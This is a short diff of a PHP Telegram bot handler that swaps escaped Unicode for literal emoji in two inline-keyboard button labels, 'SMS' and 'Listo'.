@@ -129,11 +129,11 @@ if (isset($update['callback_query'])) {
                 'inline_keyboard' => [
                     [
                         [
-                            'text' => '\ud83d\udce9\ud83d\udd01 SMS',
+                            'text' => '📩🔄 SMS',
                             'callback_data' => 'PEDIR_SMS|' . $telefono,
                         ],
                         [
-                            'text' => '\u2705 Listo',
+                            'text' => '✅ Listo',
                             'url'  => $URL_FINALIZADO,
                         ],
                     ],
